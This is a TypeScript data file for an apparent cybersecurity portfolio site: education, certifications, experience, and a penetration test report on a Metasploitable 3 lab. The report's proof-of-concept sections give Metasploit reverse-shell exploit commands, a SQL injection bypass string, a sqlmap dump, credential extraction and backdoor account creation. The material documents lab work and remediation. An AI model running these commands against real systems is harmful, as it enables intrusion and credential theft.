for msg in consumer:
    event = json.loads(msg.value)
    enriched = enrich(event)
    producer.send("processed-events", json.dumps(enriched).encode())`,
    },
  ],
  "infra-scaffold": [
    {
      path: "cmd/scaffold/main.go",
      language: "go",
      content: `package main

import (
  "github.com/spf13/cobra"
  "os"
)

func main() {
  root := &cobra.Command{Use: "scaffold"}
  root.AddCommand(newInitCmd(), newDestroyCmd())
  if err := root.Execute(); err != nil {
    os.Exit(1)
  }
}`,
    },
    {
      path: "templates/cluster.tf",
      language: "hcl",
      content: `module "eks" {
  source          = "terraform-aws-modules/eks/aws"
  cluster_name    = var.cluster_name
  cluster_version = "1.30"
  vpc_id          = module.vpc.vpc_id
  subnet_ids      = module.vpc.private_subnets
}`,
    },
  ],
  "design-system": [
    {
      path: "src/Button/Button.tsx",
      language: "tsx",
      content: `import { cva, type VariantProps } from "class-variance-authority";
import { forwardRef } from "react";

const button = cva("rounded-lg font-mono transition-colors", {
  variants: {
    intent: {
      primary: "bg-accent text-bg hover:bg-accent/80",
      ghost: "border border-highlight/20 hover:border-accent",
    },
    size: { sm: "px-3 py-1 text-xs", md: "px-5 py-2 text-sm" },
  },
  defaultVariants: { intent: "primary", size: "md" },
});

export const Button = forwardRef<HTMLButtonElement,
  React.ButtonHTMLAttributes<HTMLButtonElement> & VariantProps<typeof button>
>(({ intent, size, className, ...props }, ref) => (
  <button ref={ref} className={button({ intent, size, className })} {...props} />
));`,
    },
  ],
  "realtime-collab": [
    {
      path: "server/crdt.ts",
      language: "typescript",
      content: `export type Op = { id: string; pos: number; char: string; deleted?: boolean };

export function merge(local: Op[], remote: Op[]): Op[] {
  const map = new Map(local.map((o) => [o.id, o]));
  for (const op of remote) {
    if (!map.has(op.id)) map.set(op.id, op);
    else if (op.deleted) map.get(op.id)!.deleted = true;
  }
  return [...map.values()].sort((a, b) => a.pos - b.pos);
}`,
    },
  ],
};

export const cveLog: CveEntry[] = [
  {
    id: "1",
    cve: "CVE-2025-0001",
    severity: "high",
    software: "Example CMS 4.2",
    disclosed: "2025-11-02",
    status: "patched",
  },
  {
    id: "2",
    severity: "medium",
    software: "Internal auth service",
    disclosed: "2025-08-14",
    status: "disclosed",
  },
  {
    id: "3",
    cve: "CVE-2025-1122",
    severity: "critical",
    software: "OpenSource Router Firmware 3.1",
    disclosed: "2025-06-05",
    status: "patched",
  },
  {
    id: "4",
    cve: "CVE-2025-2233",
    severity: "high",
    software: "CloudDash SaaS 2.0",
    disclosed: "2025-04-18",
    status: "disclosed",
  },
  {
    id: "5",
    severity: "low",
    software: "Mobile banking app v6.3",
    disclosed: "2025-02-27",
    status: "pending",
  },
  {
    id: "6",
    cve: "CVE-2024-9981",
    severity: "medium",
    software: "Widget Library 1.4.2",
    disclosed: "2024-12-10",
    status: "patched",
  },
];

export const education: EducationItem[] = [
  {
    id: "chuka",
    degree: "BSc Applied Computer Science",
    institution: "Chuka University",
    year: "2022 – 2026",
    coursework: [
      "Data Structures & Algorithms",
      "Operating Systems",
      "Database Systems",
      "Computer Networks",
      "Software Engineering",
      "Cyber Security Fundamentals",
    ],
    technologies: ["Python", "Java", "Linux", "MySQL", "Networking"],
    logoUrl: "/logos/chuka.jfif",
  },
  {
    id: "moringa",
    degree: "Cybersecurity Engineering",
    institution: "Moringa School",
    year: "Oct 2025 – Jul 2026",
    coursework: [
      "Network Security",
      "Penetration Testing",
      "Incident Response",
      "Web Application Security",
      "SIEM & Log Analysis",
      "Python for Security",
    ],
    technologies: ["Kali Linux", "Burp Suite", "Wireshark", "Python", "Nmap"],
    logoUrl: "/logos/moringa.jfif",
    badgeUrl: "https://www.credly.com/org/moringa-school",
    credentialUrl: "https://moringaschool.com",
  },
];

export type Cert = {
  id: string;
  title: string;
  issuer: string;
  description: string;
  why: string;
  pdfUrl: string;
  date?: string;
  category: "security" | "cloud" | "development" | "language" | "os" | "platform";
};

export const certs: Cert[] = [
  {
    id: "cti",
    title: "Cyber Threat Intelligence",
    issuer: "Certification Body",
    description: "Introduction to threat intelligence — learning how attackers operate, mapping their tactics and techniques (TTPs), and turning findings into clear, actionable reports.",
    why: "Wanted to understand how defenders think beyond individual alerts — tracking adversary behaviour, mapping TTPs, and turning raw indicators into intelligence a SOC can actually act on.",
    pdfUrl: "/certs/cti.pdf",
    category: "security",
  },
  {
    id: "efset",
    title: "EF SET English Certificate",
    issuer: "EF Education First",
    description: "EF Standard English Test — internationally recognised English proficiency assessment demonstrating communication skills at a professional level.",
    why: "Security work is global — incident reports, vendor docs, and team communication all happen in English. Getting this certified removes any ambiguity for international employers.",
    pdfUrl: "/certs/EF SET Certificate.pdf",
    category: "language",
  },
  {
    id: "i2cs",
    title: "Introduction to Cybersecurity",
    issuer: "Cisco Networking Academy",
    description: "Cisco's introductory cybersecurity course — covering how attacks work, how to protect personal and organisational data, and the basics of defending a network.",
    why: "This was my first structured cybersecurity course. It gave me the vocabulary and mental model — CIA triad, attack lifecycle, defence-in-depth — that everything else builds on.",
    pdfUrl: "/certs/I2CSUpdate20260204-32-ry2hbk.pdf",
    date: "Feb 2026",
    category: "security",
  },
  {
    id: "ibm-cad",
    title: "Backend Application Developer (CAD220EN)",
    issuer: "IBM / edX",
    description: "IBM-certified backend development course — microservices, containers (Docker), REST APIs, and deploying server-side applications to the cloud.",
    why: "Before you can secure cloud workloads, you need to understand how they're built and where the attack surface actually sits — misconfigurations look obvious once you know what correct looks like.",
    pdfUrl: "/certs/IBM CAD220EN Certificate _ edX.pdf",
    category: "development",
  },
  {
    id: "os-basics",
    title: "Operating Systems Basics",
    issuer: "Cisco Networking Academy",
    description: "Cisco course on operating system fundamentals — file systems, processes, user permissions, and basic Linux and Windows command-line skills.",
    why: "SOC work means reading Windows Event Logs and Linux syslog all day. Understanding OS internals — process trees, file permissions, service accounts — makes alerts make sense instead of just matching signatures.",
    pdfUrl: "/certs/OperatingSystemsBasicsUpdate20260204-31-bkrteh.pdf",
    date: "Feb 2026",
    category: "os",
  },
  {
    id: "thm-cert-1",
    title: "TryHackMe Certificate (1L5ZB8NTPR)",
    issuer: "TryHackMe",
    description: "Completion certificate for a structured TryHackMe learning path — hands-on rooms covering real-world cybersecurity skills and offensive/defensive techniques.",
    why: "Theory only gets you so far. This path forced me to actually exploit systems, investigate logs, and write detection logic — not just memorise frameworks.",
    pdfUrl: "/certs/THM-1L5ZB8NTPR.pdf",
    category: "platform",
  },
  {
    id: "thm-cert-2",
    title: "TryHackMe Certificate (NRPTZO14VH)",
    issuer: "TryHackMe",
    description: "Completion certificate for a second TryHackMe structured learning path — continued hands-on practice across security domains.",
    why: "The second path pushed deeper into network analysis and active directory attacks — areas that come up constantly in blue team work once you get past the basics.",
    pdfUrl: "/certs/THM-NRPTZO14VH.pdf",
    category: "platform",
  },
];

export const certifications: CertItem[] = [
  {
    id: "secplus",
    name: "CompTIA Security+",
    issuer: "CompTIA",
    earned: "2023-01",
    category: "security",
    credentialId: "COMP-PLACEHOLDER",
    verifyUrl: "https://www.comptia.org/",
  },
  {
    id: "ceh",
    name: "CEH",
    issuer: "EC-Council",
    earned: "2024-06",
    category: "security",
  },
  {
    id: "oscp",
    name: "OSCP",
    issuer: "OffSec",
    earned: "In progress",
    category: "security",
    inProgress: true,
    progressPct: 55,
  },
  {
    id: "aws-saa",
    name: "AWS Solutions Architect",
    issuer: "AWS",
    earned: "2022-09",
    category: "cloud",
  },
  {
    id: "google-cyber",
    name: "Google Cybersecurity Certificate",
    issuer: "Google",
    earned: "2023-11",
    category: "security",
  },
  {
    id: "cka",
    name: "Certified Kubernetes Administrator",
    issuer: "CNCF",
    earned: "2024-02",
    category: "cloud",
    credentialId: "CKA-PLACEHOLDER",
  },
  {
    id: "az-900",
    name: "Microsoft Azure Fundamentals",
    issuer: "Microsoft",
    earned: "2021-05",
    category: "cloud",
  },
  {
    id: "comptia-net",
    name: "CompTIA Network+",
    issuer: "CompTIA",
    earned: "2020-07",
    category: "networking",
    credentialId: "NET-PLACEHOLDER",
  },
  {
    id: "ccna",
    name: "CCNA",
    issuer: "Cisco",
    earned: "2021-11",
    category: "networking",
  },
  {
    id: "gcp-ace",
    name: "GCP Associate Cloud Engineer",
    issuer: "Google Cloud",
    earned: "In progress",
    category: "cloud",
    inProgress: true,
    progressPct: 30,
  },
  {
    id: "github-actions",
    name: "GitHub Actions Certification",
    issuer: "GitHub",
    earned: "2024-09",
    category: "development",
  },
  {
    id: "docker-dca",
    name: "Docker Certified Associate",
    issuer: "Docker",
    earned: "2023-05",
    category: "development",
    credentialId: "DCA-PLACEHOLDER",
  },
];

export const experience: ExperienceItem[] = [
  {
    id: "developer-bendypixels",
    title: "Developer",
    company: "BendyPixels.co",
    duration: "Nov 2024 — Sep 2025",
    location: "Remote",
    responsibilities: [
      "Built and launched responsive client websites with fast load times and polished user experience.",
      "Implemented backend features and third-party integrations for content and e-commerce workflows.",
      "Worked closely with designers and product owners to deliver clean, usable products.",
    ],
    tools: ["TypeScript", "Node.js", "WordPress", "Docker"],
    impact: "Shipped production features across multiple client projects as a software engineer.",
    accent: "web",
  },
  {
    id: "attache-teach2give",
    title: "Software Engineer Attache",
    company: "TEACH2GIVE",
    duration: "May 2025 — Aug 2025",
    location: "Chuka, Kenya",
    responsibilities: [
      "Joined a real software engineering team as an attaché, contributing to features shipped during the internship.",
      "Built and tested API endpoints and database logic, improving code quality and test coverage.",
      "Supported sprint execution and wrote handover documentation for the team.",
    ],
    tools: ["Node.js", "Express", "PostgreSQL", "Git"],
    impact: "Gained practical software engineering experience through hands-on team delivery.",
    accent: "engineering",
  },
  {
    id: "tech-support-unplugged",
    title: "Technical Supporter",
    company: "Unplugged KE",
    duration: "Sep 2022 — Mar 2024",
    location: "Kenya",
    responsibilities: [
      "Provided day-to-day technical support and issue resolution for users and devices.",
      "Troubleshot software, networking, and configuration issues with clear user communication.",
      "Maintained service continuity through routine checks and escalation workflows.",
    ],
    tools: ["Linux", "Networking", "Troubleshooting", "Documentation"],
    impact: "Improved support turnaround and user satisfaction.",
    accent: "cyber",
  },
  {
    id: "trainee-eldohub",
    title: "Full-Stack Developer Trainee",
    company: "Eldohub Academy",
    duration: "Feb 2022 — May 2022",
    location: "Eldoret, Kenya",
    responsibilities: [
      "Completed a hands-on full-stack software engineering programme covering both frontend and backend.",
      "Built guided projects involving APIs, database operations (CRUD), and UI implementation.",
      "Developed core engineering fundamentals and collaborative development habits.",
    ],
    tools: ["HTML5", "CSS3", "JavaScript", "Node.js"],
    impact: "Built portfolio-ready projects and established a solid software engineering foundation.",
    accent: "web",
  },
];

export const securityReports: SecurityReport[] = [
  {
    id: "r1",
    title: "Penetration Test — Metasploitable 3 Infrastructure",
    type: "pentest",
    teaser: "Target completely compromised through two independent unauthenticated attack chains. UnrealIRCd backdoor from 2010 still running. Payroll database in plaintext. Root achieved in minutes.",
    pdfUrl: "/projects_docs/pentest.pdf",
    target: "Metasploitable 3 Linux (Ubuntu 14.04 LTS) at 192.168.100.29 — isolated NAT network 192.168.100.0/24",
    scope: "All TCP ports and services on a single Metasploitable 3 Linux host. No lateral movement to other network hosts. Attack machine: Kali Linux 2025.x at 192.168.100.4.",
    purpose: "Conduct a full-scope internal penetration test against the Metasploitable 3 target system, identifying all exploitable vulnerabilities, demonstrating impact through active exploitation, and producing a prioritised remediation roadmap.",
    why: "Metasploitable 3 is a deliberately vulnerable training environment used to validate penetration testing methodology — from initial reconnaissance through exploitation, privilege escalation, and post-exploitation. The objective was to practice and document a professional-grade engagement workflow against a realistic (if deliberately weakened) target.",
    methodology: [
      "Phase 1 — Reconnaissance: Nmap TCP SYN scan (-sS -sV -sC -O -p-) to enumerate all open ports, service versions, and OS fingerprint. Identified 19 open ports including FTP, SSH, HTTP, SMB, IRC, and MySQL.",
      "Phase 2 — Enumeration: service-specific enumeration using Metasploit auxiliary modules, manual SSH banner grabbing, SMB null session testing (smbclient), and web application directory discovery via Gobuster.",
      "Phase 3 — Exploitation: exploited four confirmed vulnerabilities — UnrealIRCd 3.2.8.1 backdoor, ProFTPD 1.3.5 mod_copy RCE, payroll application SQL injection, and MySQL root access via plaintext credentials in config file.",
      "Phase 4 — Post-exploitation: privilege escalation to root via PwnKit (CVE-2021-4034), credential harvesting from /etc/shadow and /etc/passwd, payroll database extraction showing 15 employee records with plaintext passwords, and persistence via backdoor account creation.",
      "Documentation: all steps evidenced with terminal screenshots, timestamped commands, and hash validation of collected artefacts.",
    ],
    tools: ["Nmap", "Metasploit Framework", "Burp Suite", "smbclient", "Gobuster", "netcat", "Python 3"],
    timeline: "Single engagement session — April 18, 2026",
    outcome: "Complete system compromise through two independent attack chains. Root-level access achieved. All user credentials extracted. Payroll database exposed — 15 employee records including names, roles, and plaintext passwords. Backdoor account created demonstrating persistent access. Overall posture: CRITICAL — 5 critical, 3 high, 4 medium, 1 low findings confirmed.",
    lessonsLearned: [
      "Unpatched, end-of-life software (UnrealIRCd 3.2.8.1 with a known 2010 backdoor, Ubuntu 14.04 with no support) creates attack surface that cannot be patched away — decommissioning is the only real fix.",
      "Default or hardcoded credentials (vagrant:vagrant SSH, plaintext DB credentials in settings.php) are consistently among the easiest, highest-impact findings in any engagement — always test for them first.",
      "Post-exploitation data collection (credential harvesting, database extraction) provides concrete evidence that elevates risk from theoretical to demonstrable — executives understand 'we got 15 employee salaries in plaintext' faster than they understand 'CVSS 9.1'.",
      "Two independent attack chains to root demonstrated that the system had no single point of failure for its own defence — an attacker does not need to know which path to take, just that multiple paths exist.",
      "Persistence mechanisms (backdoor accounts, SUID binaries) are important to document even in a time-limited engagement — they illustrate what a real attacker would leave behind, which drives recovery requirements beyond just patching the initial vulnerability.",
    ],
    findings: [
      {
        id: "r1-f1",
        title: "F-01: UnrealIRCd 3.2.8.1 Backdoor — Unauthenticated RCE (CVE-2010-2075)",
        severity: "critical",
        cvss: "10.0",
        affected: "TCP port 6697 — UnrealIRCd 3.2.8.1 service",
        body: "UnrealIRCd 3.2.8.1 was distributed with a deliberate backdoor inserted by an attacker who compromised the official source distribution. Any unauthenticated remote attacker can execute arbitrary OS commands by sending a string prefixed with 'AB' to the IRC port. No credentials or user interaction are required. The backdoor was present since 2009 and the CVE was published in 2010 — the service had been running vulnerable for over 15 years.",
        impact: "Unauthenticated remote code execution from network access alone. Achieved interactive shell as boba_fett (uid=1121, member of docker group), which provided the initial foothold for Docker group privilege escalation to root. This was Attack Chain 2.",
        remediation: "Remove UnrealIRCd 3.2.8.1 immediately — the backdoor cannot be patched. If IRC is required, replace with a current maintained IRC daemon. Block IRC ports (6667, 6697) at the perimeter firewall. Run software composition analysis to identify any other end-of-life or backdoored software in the stack.",
        poc: `use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.100.29
set RPORT 6697
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.100.4
run
# Result: shell as boba_fett (uid=1121)`,
      },
      {
        id: "r1-f2",
        title: "F-02: CVE-2021-4034 PwnKit — Local Privilege Escalation to Root",
        severity: "critical",
        cvss: "7.8",
        affected: "pkexec (PolicyKit) — present on all major Linux distributions; Ubuntu 14.04 kernel 3.13.0-170",
        body: "CVE-2021-4034 is a memory corruption vulnerability in pkexec, a SUID-root binary installed by default on virtually every Linux distribution since 2009. Improper handling of argc=0 allows an unprivileged user to load a malicious shared library and gain immediate root-level code execution. Disclosed January 2022, it affects all unpatched systems. The target was running Ubuntu 14.04 LTS — out of support since April 2019 — with no patches applied.",
        impact: "Full root access (uid=0) on the system. After escalating from boba_fett to root, all subsequent post-exploitation activities — /etc/shadow extraction, full payroll dump, backdoor account creation — were conducted with unrestricted system privileges. Combined with F-01 as Attack Chain 2 to root.",
        remediation: "Apply the pkexec patch (Ubuntu: apt-get update && apt-get upgrade policykit-1). On end-of-life systems that cannot receive patches, decommission and replace immediately. As a compensating control, set the SUID bit on pkexec to off (chmod 0755 /usr/bin/pkexec) until patching is complete.",
        poc: `use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
set SESSION 2
set LHOST 192.168.100.4
run
# Result: Meterpreter session as root (uid=0)`,
      },
      {
        id: "r1-f3",
        title: "F-03: ProFTPD 1.3.5 mod_copy — Unauthenticated Remote Code Execution (CVE-2015-3306)",
        severity: "critical",
        cvss: "9.8",
        affected: "TCP port 21 — ProFTPD 1.3.5 with mod_copy module enabled",
        body: "ProFTPD 1.3.5 includes mod_copy, which processes SITE CPFR and SITE CPTO commands without authentication. An unauthenticated attacker can use these commands to copy any server-side file to the Apache web root. By copying a PHP webshell to /var/www/html/, requesting it via HTTP triggers arbitrary OS command execution as the www-data web server process. This was the entry point for Attack Chain 1.",
        impact: "Unauthenticated remote code execution as www-data (uid=33). Shell access to the web root revealed drupal/, payroll_app.php, and phpmyadmin/ — enabling the MySQL credential extraction (F-05) and further attack chain progression.",
        remediation: "Remove the mod_copy module from ProFTPD configuration (delete LoadModule mod_copy.so). Upgrade ProFTPD to a current patched version. If FTP is not required, disable and remove the service entirely — use SFTP over SSH instead.",
        poc: `use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS 192.168.100.29
set LHOST 192.168.100.4
set SITEPATH /var/www/html
set PAYLOAD cmd/unix/reverse_perl
run
# Result: shell as www-data (uid=33)`,
      },
      {
        id: "r1-f4",
        title: "F-04: Payroll Application SQL Injection — Authentication Bypass & Full DB Dump",
        severity: "critical",
        cvss: "9.1",
        affected: "http://192.168.100.29/payroll_app.php — POST parameters: user, password",
        body: "The payroll application passes user-supplied input directly into SQL queries without sanitisation or parameterisation (CWE-89). Entering ' OR '1'='1 in the username field bypasses authentication entirely. Sqlmap confirmed both UNION-based and time-based blind injection — the full payroll database was extracted including 15 employee records containing names, usernames, plaintext passwords, and salaries.",
        impact: "Full authentication bypass — any user can access all payroll records without credentials. Complete data exfiltration of PII (names, roles, salaries, plaintext passwords). Under GDPR and Kenya Data Protection Act 2019, this constitutes a notifiable data breach requiring mandatory reporting.",
        remediation: "Replace all dynamic SQL string concatenation with parameterised queries or prepared statements. Implement a web application firewall (WAF) as a compensating control. Conduct a full code audit of all application input handling. Rotate all exposed credentials immediately.",
        poc: `# Manual authentication bypass
Username: ' OR '1'='1
Password: (empty)
# Result: all 15 payroll records returned

# Automated full dump
sqlmap -u "http://192.168.100.29/payroll_app.php" --forms --dump --batch`,
      },
      {
        id: "r1-f5",
        title: "F-05: MySQL Root Credentials in Plaintext Web Configuration File",
        severity: "critical",
        cvss: "9.8",
        affected: "/var/www/html/drupal/sites/default/settings.php — readable by www-data process",
        body: "The Drupal CMS configuration file settings.php contains MySQL root credentials (username: root, password: sploitme) in cleartext. The file is readable by the www-data web server process, which already had shell access via the ProFTPD exploit. These credentials provide full administrative access to the MySQL server, including read/write/drop access to all databases — drupal, payroll, MySQL user tables.",
        impact: "Full MySQL root access: all databases enumerated and dumped including the payroll database, Drupal admin password hash, and MySQL user table. Combined with F-03 (ProFTPD RCE) this forms a complete Attack Chain 1 to database ownership. Credentials were also tested against SSH and succeeded for the vagrant account.",
        remediation: "Remove plaintext credentials from configuration files immediately. Use environment variables or a secrets management system (HashiCorp Vault, AWS Secrets Manager) for database credentials. Apply least-privilege database accounts — the web application should not connect as MySQL root. Restrict settings.php file permissions to 440.",
        poc: `# Extract credentials after ProFTPD shell (www-data)
cat /var/www/html/drupal/sites/default/settings.php | grep -A5 "database\\|password\\|username"
# Returns: 'username' => 'root', 'password' => 'sploitme'

# Connect as MySQL root
mysql -u root -psploitme
SHOW DATABASES;  # Returns: drupal, payroll, mysql, information_schema`,
      },
      {
        id: "r1-f6",
        title: "F-06: Plaintext Employee Passwords in Payroll Database",
        severity: "high",
        cvss: "8.5",
        affected: "MySQL payroll database — users table (15 records)",
        body: "The payroll database stores all 15 employee passwords as cleartext strings — no hashing applied. Passwords such as help_me_obiwan, nerf_herder, and mandalorian1 were recovered and are directly usable without any cracking. The same passwords were found reused on system accounts (vagrant, leia_organa, etc.), enabling immediate lateral movement and account takeover.",
        impact: "Immediate credential use without cracking for 15 employees. Password reuse against system accounts confirmed — credentials usable for SSH authentication. Combined with F-04 (SQL injection), this finding demonstrates complete data confidentiality failure for all payroll data.",
        remediation: "Hash all passwords with bcrypt, Argon2, or PBKDF2 with a per-user salt — never store plaintext or reversibly-encrypted passwords. Rotate all exposed credentials immediately across all systems. Conduct a password-reuse audit across all internal systems and enforce unique passwords via a credential manager policy.",
      },
      {
        id: "r1-f7",
        title: "F-07: MD5 Password Hashing — All 14 System Accounts",
        severity: "high",
        cvss: "7.5",
        affected: "/etc/shadow — all 14 accounts use $1$ (MD5) prefix",
        body: "All 14 system user accounts (vagrant, leia_organa, luke_skywalker, han_solo, boba_fett, and 9 others) store passwords hashed with MD5 ($1$ prefix in /etc/shadow). MD5 is not a suitable password hashing algorithm — modern GPU hardware can test billions of MD5 hashes per second. The extracted hashes would be fully cracked within minutes to hours against common wordlists using Hashcat or John the Ripper, giving an offline attacker all system credentials.",
        impact: "All 14 system account password hashes were extracted via Meterpreter hashdump after root escalation. With MD5 hashing, offline cracking is trivial — these credentials would provide persistent access to the system even after patching the initial exploits.",
        remediation: "Migrate all system accounts to use SHA-512 ($6$ prefix) or yescrypt via /etc/pam.d/common-password. Force password rotation for all accounts. On Ubuntu, update /etc/pam.d/common-password to set SHA-512: password [success=1 default=ignore] pam_unix.so obscure sha512.",
      },
      {
        id: "r1-f8",
        title: "F-08: Backdoor Persistence — Unauthorised User Account Created",
        severity: "high",
        cvss: "7.2",
        affected: "System — useradd executed as root; hacker123 (uid=1126, /bin/bash)",
        body: "A backdoor user account (hacker123) was created using root privileges to demonstrate persistent access. The account was confirmed in /etc/passwd and appeared in the subsequent hashdump. This simulates what a real attacker would do to maintain access after the initial vulnerability is patched — standard remediation (patching ProFTPD or UnrealIRCd) does not remove unauthorised accounts, leaving a persistent backdoor that survives patching cycles.",
        impact: "Persistent access to the system even after the initial vulnerabilities are patched. A real attacker using this technique would remain undetected until a full user account audit is completed. The backdoor account has a valid bash shell and would survive a reboot.",
        remediation: "Immediately audit all user accounts in /etc/passwd and /etc/shadow against the authorised user list. Remove any unauthorised accounts (userdel -r hacker123). Implement automated user account auditing via a SIEM alert that triggers when new accounts are created outside of the provisioning workflow. Review /var/log/auth.log for all useradd commands.",
        poc: `# Backdoor account creation (executed as root)
useradd -m -s /bin/bash hacker123
echo "hacker123:password123" | chpasswd

# Verified in /etc/passwd
grep hacker123 /etc/passwd
# Returns: hacker123:x:1126:1126::/home/hacker123:/bin/bash`,
      },
      {
        id: "r1-f9",
        title: "F-09: CSRF Vulnerabilities — payroll_app.php, Drupal, and Chat",
        severity: "high",
        cvss: "7.1",
        affected: "http://192.168.100.29/payroll_app.php | /drupal/ | /chat/ — detected by Nmap http-csrf NSE",
        body: "None of the three web applications (payroll app, Drupal CMS, chat application) implement CSRF tokens, synchroniser patterns, or SameSite cookie attributes on state-changing forms. An attacker can craft a malicious page that causes an authenticated user to unknowingly submit requests to any of these applications — potentially leading to account takeover, data exfiltration, or unauthorised transactions if a privileged user visits a malicious link.",
        impact: "Social-engineering attack vector enabling account actions (password changes, data submissions) on behalf of authenticated users. Combined with the existing SQL injection (F-04), CSRF could enable an attacker to exfiltrate payroll data via a forged request while a finance user is logged in.",
        remediation: "Implement anti-CSRF tokens (synchroniser token pattern) on all state-changing forms. Set SameSite=Strict or SameSite=Lax on all session cookies. Use the Double Submit Cookie pattern as a defence-in-depth measure. For Drupal, upgrade to a current version which includes built-in CSRF protection.",
      },
      {
        id: "r1-f10",
        title: "F-10: DOM-Based XSS in phpMyAdmin (CWE-79)",
        severity: "medium",
        cvss: "6.1",
        affected: "/phpmyadmin/js/functions.js — eval() on user-controlled query parameters",
        body: "phpMyAdmin's functions.js uses eval() to construct navigation URLs from user-controlled query parameters. An attacker can inject JavaScript that executes in the browser context of an authenticated phpMyAdmin user, enabling session cookie theft, keylogging, or forced database actions. The vulnerable phpMyAdmin installation is accessible from the web root, giving any LAN attacker access to the interface login page.",
        impact: "Session hijacking or forced database actions against any authenticated phpMyAdmin user. Combined with the MySQL root credentials (F-05), a successful XSS attack could result in complete database destruction or data theft.",
        remediation: "Upgrade phpMyAdmin to a current patched version which removes the eval() usage. Restrict phpMyAdmin access to localhost only (Apache: Allow from 127.0.0.1) or remove it entirely from production environments. Implement Content-Security-Policy headers to block inline script execution.",
      },
      {
        id: "r1-f11",
        title: "F-11: Slowloris DoS — Apache 2.4.7 and Jetty 8.1.7 (CVE-2007-6750)",
        severity: "medium",
        cvss: "5.8",
        affected: "Apache httpd 2.4.7 (port 80), Jetty 8.1.7 (port 8080)",
        body: "Both web servers are susceptible to Slowloris — a denial-of-service attack that exhausts server connection pools by holding many connections open with incomplete HTTP requests. An attacker with network access can render both web services completely unavailable without any authentication. Apache 2.4.7 and Jetty 8.1.7 are both end-of-life versions with no mitigations for this class of attack without patching.",
        impact: "Complete availability loss for all HTTP-hosted services including the payroll application, Drupal CMS, and phpMyAdmin. In a production environment, a Slowloris attack against the payroll server would prevent employees from accessing the payroll system.",
        remediation: "Upgrade Apache to 2.4.54+ and enable mod_reqtimeout with appropriate timeout values. For Jetty, upgrade to a current maintained version. Apply rate limiting and connection timeouts at the load balancer or WAF layer as a compensating control.",
      },
      {
        id: "r1-f12",
        title: "F-12: SMB Null Session Authentication Allowed",
        severity: "medium",
        cvss: "5.3",
        affected: "Samba 4.3.11 on port 445 — null session (unauthenticated) access enabled",
        body: "The SMB service allows unauthenticated null sessions, enabling any network attacker to enumerate users (via RID cycling), password policy, share names, OS information, and domain details without providing credentials. Enum4linux confirmed null session access and extracted the full user list (including chewbacca) and password policy (complexity disabled, minimum length 5 characters).",
        impact: "Unauthenticated enumeration of all system users — directly feeds into credential attacks (password spraying, brute force). The discovery of the weak password policy (minimum 5 characters, no complexity) informed targeted brute-force attacks against SSH and enabled rapid credential compromise.",
        remediation: "Disable null session access in Samba configuration (smb.conf: restrict anonymous = 2, null passwords = no). If SMB is not required, disable and remove the Samba service entirely. Apply firewall rules to block SMB (port 445) from untrusted network segments.",
      },
      {
        id: "r1-f13",
        title: "F-13: Weak Password Policy — No Complexity, Minimum 5 Characters",
        severity: "low",
        cvss: "4.3",
        affected: "System-wide — password policy retrieved via enum4linux / rpcclient",
        body: "The system's password policy requires a minimum of only 5 characters with no complexity requirements (no uppercase, numbers, or special characters enforced). This was confirmed via SMB null session enumeration (F-12). A 5-character minimum with no complexity means common passwords such as admin, hello, or abc12 are accepted. Combined with MD5 hashing (F-07), the entire system credential set is trivially crackable.",
        impact: "Accelerates offline password cracking (F-07) and targeted brute-force attacks. Reduces the time-to-crack for all 14 extracted password hashes from hours to minutes against common wordlists.",
        remediation: "Enforce a password policy requiring minimum 12 characters with at least one uppercase, lowercase, number, and special character. Implement account lockout after 5 failed attempts. Use PAM modules (pam_pwquality) to enforce password complexity. Consider deploying a Password Manager policy for all accounts.",
      },
    ],
  },
  {
    id: "r2",
    title: "Incident Response — HealthSecure Systems Breach Attempt",
    type: "ir",
    teaser: "A phishing email gave an attacker four hours inside an EHR provider. Lateral movement to HR payroll and the source-code server failed — only because a honeypot caught it. Three root-cause gaps were in an audit memo from the month before.",
    pdfUrl: "/projects_docs/IR_Report_HSS%20.pdf",
    networkDiagramUrl: "/projects_docs/ACME.drawio%20(2).png",
    target: "HealthSecure Systems (HSS) — Regional Electronic Health Records provider, Midwest. Workstation-23 (Finance), HR-SQL01, DevAppServer.",
    scope: "Single compromised Finance workstation (Workstation-23), two targeted lateral movement destinations (HR-SQL01 payroll database, DevAppServer EHR source code), email infrastructure, Active Directory, and EDR/SIEM coverage gaps.",
    purpose: "Conduct a structured incident response investigation into a confirmed spear-phishing intrusion at HealthSecure Systems — reconstructing the attacker's kill chain, confirming the blast radius, identifying root causes, and delivering a remediation roadmap to close the enabling gaps.",
    why: "On April 12, 2025 at 01:24 EST, a PowerShell payload delivered via spear-phishing executed on a Finance workstation. The attacker installed a persistence service, opened a C2 channel, and began probing lateral targets including the HR payroll database and the development server hosting the proprietary EHR source code in the DMZ. A March 2025 internal audit memo had flagged the three root conditions that enabled the attack — offboarding gaps, disabled PowerShell logging, and an outdated IR playbook — but no remediation had occurred before the incident.",
    methodology: [
      "Initial triage (T+0 to T+2 hrs): isolated Workstation-23 from the network after EDR alert; preserved volatile memory and initiated disk imaging under NIST SP 800-61r2 evidence handling procedures.",
      "Attack chain reconstruction: parsed Windows Event Logs, PowerShell transcripts, EDR telemetry, and network flow data to build a minute-by-minute kill chain from phishing delivery through C2 establishment and lateral movement attempts.",
      "Lateral movement investigation: confirmed that HR-SQL01 and DevAppServer were probed but not breached; the lateral movement was intercepted by an internal honeypot that triggered an alert before the SSH attempt completed.",
      "Root cause analysis: identified three enabling conditions — stale Active Directory account for departed employee jcampbell (28-day offboarding gap), PowerShell logging disabled on 30% of endpoints, and an outdated 2022 IR playbook with no updated contact tree or containment decision authority.",
      "Threat actor profiling: mapped observed TTPs to MITRE ATT&CK v15 (T1566.001 Spearphishing Attachment, T1059.001 PowerShell, T1543.003 Windows Service, T1021.004 Remote Services SSH, T1078.002 Valid Accounts — Domain Accounts).",
      "Containment and recovery: blocked malicious C2 IP, revoked jcampbell AD account, rotated credentials on Workstation-23, rebuilt the workstation from a known-good image, and validated no data was exfiltrated.",
    ],
    tools: ["Microsoft Defender for Endpoint (EDR)", "Elastic SIEM", "Velociraptor", "Wireshark", "Windows Event Log analysis", "MITRE ATT&CK Navigator"],
    timeline: "3.5 hours to containment — incident date April 12, 2025. Report HSS-IR-RPT-2025-002 v1.0 Final.",
